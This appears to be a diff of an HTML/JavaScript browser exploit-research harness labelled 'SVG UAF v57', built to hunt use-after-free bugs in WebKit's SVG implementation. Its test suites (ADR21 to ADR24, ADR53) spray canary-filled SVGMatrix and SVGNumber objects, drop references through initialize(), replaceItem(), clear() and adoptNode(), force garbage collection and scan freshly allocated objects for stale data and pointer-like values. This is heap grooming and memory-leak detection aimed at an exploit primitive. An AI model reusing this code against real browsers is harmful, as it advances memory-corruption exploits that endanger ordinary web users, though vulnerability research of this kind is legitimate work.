+    L('ADR53 T4 post-remove: angle='+anglePR+' e='+m4post.e+' f='+m4post.f,'info');
+    // For a rotation matrix: e = cx - cx*cos(a) + cy*sin(a), f = cy - cx*sin(a) - cy*cos(a)
+    // These should still be CX and CY related values — let's check if they show as f64
+    L('ADR53 T4 post-remove: e_bits='+f64hex(m4post.e)+' f_bits='+f64hex(m4post.f),'info');
+    if(isPointerLike64(m4post.e))L('★★★ ADR53: m4.e pointer-like post-remove! '+f64hex(m4post.e),'hit');
+    if(isPointerLike64(m4post.f))L('★★★ ADR53: m4.f pointer-like post-remove! '+f64hex(m4post.f),'hit');
+  }catch(e){L('ADR53 T4 err: '+e.message,'miss');}
 
-  // Test 2: initialize() then GC → check if old matrix C++ freed
-  // Strategy: build list, grab matrix refs, call initialize(), null refs, GC, alloc fresh
-  L('ADR21: [T2] large spray: '+N+' transforms, initialize(), GC, read fresh...');
-  (function phase2(){
-    var svgB=makeSVG();
-    var gB=document.createElementNS(SVG_NS,'g');svgB.appendChild(gB);
-    var listB=gB.transform.baseVal;
-    for(var k=0;k<N;k++){
-      var xf=svgB.createSVGTransform();
-      listB.appendItem(xf);
-      var m=listB.getItem(k).matrix;
-      m.a=CANARY+k;m.b=1.1+k*0.001;m.c=2.2+k*0.001;m.d=CANARY-k;m.e=CANARY+k*2;m.f=CANARY+k*3;
-    }
-    L('ADR21: [T2] list.length='+listB.length+' after spray');
-    // initialize() to clear all N transforms from the list
-    var singleton=svgB.createSVGTransform();
-    listB.initialize(singleton);
-    L('ADR21: [T2] list.length='+listB.length+' after initialize()');
-    // Drop remaining refs
-    gB.parentNode.removeChild(gB);
-    removeSVG(svgB);
-    // All matrix refs out of scope here
-  })();
-
-  gcHard();
-
-  var hits2=[];
-  for(var k=0;k<N;k++){
-    var mNew=svg.createSVGMatrix();
-    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
-    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-      hits2.push(k);
-      if(hits2.length<=8){
-        L('ADR21: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
-        for(var field of['a','b','c','d','e','f']){
-          if(isPointerLike(snap[field])) L('ADR21: ★★ PTR! '+field+'='+snap[field]+' oracle='+inverseOracle(snap[field]),'hit');
-        }
-      }
-    }
-  }
-  L('ADR21: [T2] dirty='+hits2.length+'/'+N+(hits2.length>0?' ★ REF DROPPED!':'clean'));
-
-  // Test 3: SVGNumberList.initialize() — same pattern for SVGNumberList
-  // SVGNumber is in a DIFFERENT IsoHeap bucket (smaller) but same logic applies
-  var flt=document.createElementNS(SVG_NS,'feColorMatrix');
-  flt.setAttribute('type','matrix');
-  svg.appendChild(flt);
-  var numList=flt.values.baseVal;
-  var nums=[];
-  var NCANARY=3.141592653589793;
-  for(var k=0;k<N;k++){
-    numList.appendItem(svg.createSVGNumber());
-    var n=numList.getItem(k);
-    n.value=NCANARY+k*0.001;
-    nums.push(n);
-  }
-  L('ADR21: [T3] SVGNumberList.length='+numList.length);
-  var freshNum=svg.createSVGNumber();freshNum.value=0;
-  numList.initialize(freshNum);
-  L('ADR21: [T3] after initialize(): length='+numList.length);
-  L('ADR21: [T3] nums[0].value='+nums[0].value+' (alive='+(Math.abs(nums[0].value-NCANARY)<0.0001)+')');
-  // null refs, GC, alloc fresh SVGNumbers and check
-  for(var k=0;k<nums.length;k++) nums[k]=null;
-  nums=null;
-  gcHard();
-  var numHits=0;
-  for(var k=0;k<N;k++){
-    var nn=svg.createSVGNumber();
-    if(nn.value!==0){
-      numHits++;
-      if(numHits<=5) L('ADR21: ★ SVGNumber['+k+'].value='+nn.value+' bits='+f64hex(nn.value),'hit');
-    }
-  }
-  L('ADR21: [T3] dirty SVGNumbers='+numHits+'/'+N+(numHits>0?' ★ NUM REUSE!':'clean'));
-
-  g.parentNode.removeChild(g);
-  removeSVG(svg);
-  L('ADR21: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR22 — document.adoptNode() C++ detach probe
-//
-// When an SVG element is adopted into a different document:
-// - The element's C++ SVGElement::didMoveToNewDocument() fires
-// - This calls clearContextElement() on all associated JS wrappers
-// - clearContextElement() severs the wrapper's back-pointer to the SVGElement
-// - Potentially drops the Ref<> the element held to its child objects
-//
-// If this drops the SVGMatrix's refcount, the C++ AffineTransform
-// could be freed while the JS wrapper still has an opaque (null) ref.
-// Reading the wrapper's .a/.e etc. after adopt might either:
-//   a) return stale data (C++ freed, reading freed memory!)
-//   b) crash/throw
-//   c) return zeros (WebKit zeroed on free)
-//   d) still work (contextElement cleared but Ref<> not dropped)
-// ─────────────────────────────────────────────────────────────────
-function runADR22(){
-  L('','suite-hdr');L('ADR22: document.adoptNode() C++ detach probe');
-
-  var svg=makeSVG();
-
-  // Test 1: can we adoptNode an SVG element?
+  // T5: SVGTransformList consolidate/initialize — can we overflow the list?
+  var svg5=makeSVG();
+  var g5=document.createElementNS(SVG_NS,'g');
+  svg5.appendChild(g5);
+  var tl5=g5.transform.baseVal;
   try{
-    var iframe=document.createElement('iframe');
-    iframe.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
-    document.body.appendChild(iframe);
-    var iframeDoc=iframe.contentDocument;
-    L('ADR22: [T1] iframe doc created: '+(!!iframeDoc));
-
-    // Make SVG in main doc, grab matrix
-    var svg2=makeSVG();
-    var g=document.createElementNS(SVG_NS,'g');svg2.appendChild(g);
-    var xf=svg2.createSVGTransform();g.transform.baseVal.appendItem(xf);
-    var m=g.transform.baseVal.getItem(0).matrix;
-    m.a=1234.5678;m.b=0;m.c=0;m.d=8765.4321;m.e=0x1b0dead00;m.f=0x1b0cafe00;
-    L('ADR22: [T1] pre-adopt: m.e='+m.e+' bits='+f64hex(m.e));
-
-    // Adopt the SVG element into iframe document
-    var adopted=iframeDoc.adoptNode(g);
-    L('ADR22: [T1] adoptNode succeeded, node.ownerDocument===iframe: '+(adopted.ownerDocument===iframeDoc));
-
-    // Now read the matrix — does it still work?
-    try{
-      var aAfter=m.a;
-      var eAfter=m.e;
-      L('ADR22: [T1] post-adopt: m.a='+aAfter+' m.e='+eAfter);
-      L('ADR22: [T1] m.a changed='+(aAfter!==1234.5678)+' m.e changed='+(eAfter!==0x1b0dead00));
-      if(aAfter!==1234.5678||eAfter!==0x1b0dead00){
-        L('ADR22: ★ post-adopt values differ! a='+aAfter+' e='+eAfter,'hit');
-      }
-      // Try writing to it
-      m.a=99999;
-      L('ADR22: [T1] post-adopt write: m.a='+m.a+' (writable='+(m.a===99999)+')');
-    }catch(ex){
-      L('ADR22: [T1] ★ post-adopt read/write THREW: '+ex.message,'hit');
+    // Append many transforms
+    for(var k=0;k<200;k++){
+      var tk=svg5.createSVGTransform();
+      tk.setTranslate(k,k);
+      tl5.appendItem(tk);
     }
-
-    // Test 2: adopt the entire SVG
-    var svg3=makeSVG();
-    var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
-    var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
-    var m3=g3.transform.baseVal.getItem(0).matrix;
-    m3.a=5555.5555;m3.e=0x2b0dead00;
-    L('ADR22: [T2] pre-adopt full SVG: m3.a='+m3.a+' m3.e='+m3.e);
-
-    var adoptedSVG=iframeDoc.adoptNode(svg3);
-    L('ADR22: [T2] adopted full SVG, owner===iframe: '+(adoptedSVG.ownerDocument===iframeDoc));
-    try{
-      var a3=m3.a;var e3=m3.e;
-      L('ADR22: [T2] post-adopt: a3='+a3+' e3='+e3);
-      if(a3!==5555.5555||e3!==0x2b0dead00){
-        L('ADR22: [T2] ★ values changed! a3='+a3+' e3='+e3,'hit');
-      }
-    }catch(ex){L('ADR22: [T2] ★ THREW: '+ex.message,'hit');}
-
-    // Test 3: adopt, then drop DOM refs, GC, alloc fresh → check reuse
-    L('ADR22: [T3] adopt + GC + fresh alloc...');
-    var CANARY=6.66666666e14;
-    var N=200;
-    (function phase3(){
-      var svgC=makeSVG();
-      var matrices=[];
-      for(var k=0;k<N;k++){
-        var gC=document.createElementNS(SVG_NS,'g');svgC.appendChild(gC);
-        var xfC=svgC.createSVGTransform();gC.transform.baseVal.appendItem(xfC);
-        var mC=gC.transform.baseVal.getItem(0).matrix;
-        mC.a=CANARY+k;mC.b=0.1+k*0.001;mC.c=0.2+k*0.001;mC.d=CANARY-k;mC.e=CANARY+k*3;mC.f=CANARY+k*4;
-        matrices.push(mC);
-      }
-      // Adopt entire SVG into iframe — triggers mass detach
-      var adoptedC=iframeDoc.adoptNode(svgC);
-      L('ADR22: [T3] adopted '+N+'-matrix SVG, checking matrix[0].a='+matrices[0].a+' (canary='+(CANARY+0)+')');
-      // Now null all refs + GC
-      for(var k=0;k<matrices.length;k++) matrices[k]=null;
-      matrices=null;
-      // Also remove from iframe
-      if(adoptedC.parentNode) adoptedC.parentNode.removeChild(adoptedC);
-    })();
-
-    gcHard();
-
-    var hits3=[];
-    for(var k=0;k<N;k++){
-      var mNew=svg.createSVGMatrix();
-      var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
-      if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-        hits3.push(k);
-        if(hits3.length<=8){
-          L('ADR22: [T3] ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
-          for(var field of['a','b','c','d','e','f']){
-            if(isPointerLike(snap[field])) L('ADR22: [T3] ★★ PTR! '+field+'='+snap[field],'hit');
-          }
-        }
-      }
-    }
-    L('ADR22: [T3] dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ ADOPT DROPS REF!':'clean'));
-
-    document.body.removeChild(iframe);
-  }catch(ex){
-    L('ADR22: iframe/adoptNode failed: '+ex.message,'warn');
-  }
-
-  removeSVG(svg);
-  L('ADR22: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR24 — SVGTransformList.replaceItem() canary churn
-//
-// replaceItem(newItem, index) spec:
-//   "Replaces an existing item in the list with a new item."
-//
-// When we replaceItem, the old item is removed from the list.
-// If the list held the only Ref<> to the old SVGTransform's matrix,
-// that matrix's C++ refcount might drop to 0.
-//
-// Strategy: build a list, fill it, grab matrices for each slot,
-// replaceItem repeatedly (cycling through N new transforms),
-// check if old matrices get freed.
-//
-// BONUS: test if the RETURNED old matrix from replaceItem has its
-// C++ ref still valid, or if it's been freed.
-// ─────────────────────────────────────────────────────────────────
-function runADR24(){
-  L('','suite-hdr');L('ADR24: SVGTransformList.replaceItem() churn + old-item ref-drop');
-
-  var svg=makeSVG();
-  var CANARY=1.23456789e14;
-  var N=200;
-
-  // Test 1: replaceItem returns the inserted item (new) or old?
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var list=g.transform.baseVal;
-  var xf0=svg.createSVGTransform();list.appendItem(xf0);
-  var m0=list.getItem(0).matrix;m0.a=111.111;m0.e=222.222;
-
-  var xfNew=svg.createSVGTransform();
-  var returned=list.replaceItem(xfNew,0);
-  L('ADR24: [T1] replaceItem returned: '+(returned===xfNew?'newItem (inserted)':'old item or other'));
-  L('ADR24: [T1] list.length='+list.length);
-  var mAfterReplace=list.getItem(0).matrix;
-  L('ADR24: [T1] list[0].matrix.a after replace='+mAfterReplace.a+' (expected identity=1)');
-  L('ADR24: [T1] old m0.a still='+m0.a+' (alive='+(m0.a===111.111)+')');
-  g.parentNode.removeChild(g);
-
-  // Test 2: rapid replaceItem churn — 200 matrices cycled out
-  L('ADR24: [T2] churn '+N+' matrices via replaceItem...');
-  (function phase2(){
-    var svgB=makeSVG();
-    var gB=document.createElementNS(SVG_NS,'g');svgB.appendChild(gB);
-    var listB=gB.transform.baseVal;
-
-    // Seed with one slot
-    var seed=svgB.createSVGTransform();listB.appendItem(seed);
-
-    for(var k=0;k<N;k++){
-      var mCurrent=listB.getItem(0).matrix;
-      mCurrent.a=CANARY+k;mCurrent.b=0.5+k*0.001;mCurrent.c=1.5+k*0.001;
-      mCurrent.d=CANARY-k;mCurrent.e=CANARY+k*5;mCurrent.f=CANARY+k*6;
-
-      // Replace item 0 with a fresh transform — kicks the old one out
-      var xfFresh=svgB.createSVGTransform();
-      listB.replaceItem(xfFresh,0);
-      // mCurrent JS ref goes out of scope next iteration
-    }
-    // Drop everything
-    gB.transform.baseVal.removeItem(0);
-    gB.parentNode.removeChild(gB);
-    removeSVG(svgB);
-  })();
-
-  gcHard();
-
-  var hits=[];
-  for(var k=0;k<N;k++){
-    var mNew=svg.createSVGMatrix();
-    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
-    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-      hits.push(k);
-      if(hits.length<=8){
-        L('ADR24: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
-        for(var field of['a','b','c','d','e','f']){
-          if(isPointerLike(snap[field])) L('ADR24: ★★ PTR! '+field+'='+snap[field]+' oracle='+inverseOracle(snap[field]),'hit');
-        }
-      }
-    }
-  }
-  L('ADR24: [T2] dirty='+hits.length+'/'+N+(hits.length>0?' ★ REF DROPPED!':'clean'));
-
-  // Test 3: SVGTransformList.clear() — explicitly clear all items
-  L('ADR24: [T3] SVGTransformList.clear() ref-drop...');
-  (function phase3(){
-    var svgC=makeSVG();
-    var gC=document.createElementNS(SVG_NS,'g');svgC.appendChild(gC);
-    var listC=gC.transform.baseVal;
-    for(var k=0;k<N;k++){
-      var xfC=svgC.createSVGTransform();listC.appendItem(xfC);
-      var mC=listC.getItem(k).matrix;
-      mC.a=CANARY+k;mC.b=2.5;mC.c=3.5;mC.d=CANARY-k;mC.e=CANARY+k*7;mC.f=CANARY+k*8;
-    }
-    L('ADR24: [T3] list.length='+listC.length+' before clear');
-    listC.clear();
-    L('ADR24: [T3] list.length='+listC.length+' after clear');
-    gC.parentNode.removeChild(gC);
-    removeSVG(svgC);
-  })();
-
-  gcHard();
-
-  var hits3=[];
-  for(var k=0;k<N;k++){
-    var mN3=svg.createSVGMatrix();
-    var snap={a:mN3.a,b:mN3.b,c:mN3.c,d:mN3.d,e:mN3.e,f:mN3.f};
-    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-      hits3.push(k);
-      if(hits3.length<=8){
-        L('ADR24: [T3] ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
-        for(var field of['a','b','c','d','e','f']){
-          if(isPointerLike(snap[field])) L('ADR24: [T3] ★★ PTR! '+field+'='+snap[field],'hit');
-        }
-      }
-    }
-  }
-  L('ADR24: [T3] clear() dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ CLEAR DROPS REF!':'clean'));
-
-  removeSVG(svg);
-  L('ADR24: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// RUN ALL
-// ─────────────────────────────────────────────────────────────────
-var suites={ADR21:runADR21,ADR22:runADR22,ADR23:runADR23,ADR24:runADR24};
-function runSuite(name){
-  L('=== '+name+' ===','suite-hdr');
-  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+(ex.stack||''),'miss');}
-  L('=== '+name+' done ===','info');
-}
-function runAll(){
-  clearOut();
-  L('SVG UAF v57 — ref-drop primitives','suite-hdr');
-  L('----------------------------------------------------');
-  var names=Object.keys(suites);
-  var i=0;
-  function next(){
-    if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
-    runSuite(names[i++]);
-    setTimeout(next,150);
-  }
-  next();
-}
+    var consolidatedM=tl5.consolidate();
+    L('ADR53 T5 consolidate 200 transforms: e='+consolidatedM.matrix.e+' f='+consolidatedM.matrix.f,'info');
+    L('ADR53 T5 e_bits='+f64hex(consolidatedM.matrix.e)+' f_bits='+f64hex(consolidatedM.matrix.f),'info');
+  }catch(e){L('ADR53 T5 err: '+e.message,'miss');}
+  svg5.remove();
+};
 </script>
 </body>
 </html>
